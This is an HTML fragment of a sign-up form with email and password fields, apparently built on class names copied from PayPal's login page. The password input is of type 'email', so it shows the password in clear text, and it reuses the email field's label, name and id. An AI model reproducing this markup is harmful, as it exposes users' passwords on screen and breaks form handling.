    <script
        defer
        src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js"
        integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg=="
        crossorigin="anonymous"
        referrerpolicy="no-referrer"
    ></script>
    <script defer src="assets/js/sign.js"></script>
    <div class="container">
        <header>
            <p class="paypal-logo paypal-logo-long">
                <center><img src="./assets/chat.png" style="height: 150px;"></center>
            </p>
        </header>
        <div class="textInput" id="login_emaildiv">
            <div class="fieldWrapper">
                <label for="username" class="fieldLabel">Email</label>
                <input id="txt_username" name="login_email" type="email" class="hasHelp  validateEmpty " required="required"
                    aria-required="true" value="" autocomplete="off" placeholder="Enter your username">
            </div>
        </div>
        <div class="textInput" id="login_emaildiv">
            <div class="fieldWrapper">
                <label for="password" class="fieldLabel">Email</label>
                <input id="txt_password" name="login_email" type="email" class="hasHelp  validateEmpty " required="required"
                    aria-required="true" value="" autocomplete="off" placeholder="Enter your password">
            </div>
        </div>
        <div class="actions actionsSpaced">
            <button class="button actionContinue" type="submit" id="btn_sign"
                name="btnSign" value="Login">Sign Up Now !</button>
        </div>
        <hr class="hr-text">
        <a href="login.html" class="button secondary" id="createAccount">Back to Login</a>
